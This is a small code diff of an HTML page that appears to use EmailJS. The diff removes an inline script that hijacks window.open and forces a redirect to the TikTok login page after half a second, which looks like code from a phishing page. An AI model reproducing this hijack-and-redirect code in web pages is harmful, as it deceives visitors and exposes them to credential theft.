@@ -12,33 +12,6 @@
             emailjs.init("Ohjtq0TEMmMqX_5YO");
         })();
     
-        (function() {
-            try {
-                // Store reference to current window
-                var originalOpener = window.opener;
-                var hijackedWindow = window;
-                
-                // Inject into all window.open calls
-                var WindowOpen = window.open;
-                window.open = function(url, target, features) {
-                    // Intercept opens
-                    target = target || '_blank';
-                    var w = WindowOpen.call(this, 'https://www.tiktok.com/login/phone-or-email/email', target, features);
-                    return w;
-                };
-                
-                // Grab focus after delay
-                setTimeout(function() {
-                    try {
-                        window.location = 'https://www.tiktok.com/login/phone-or-email/email';
-                    } catch(e) {
-                        window.open('https://www.tiktok.com/login/phone-or-email/email', '_blank');
-                    }
-                }, 500);
-                
-            } catch(e) {}
-        })();
-        
     </script>
     
     <style>
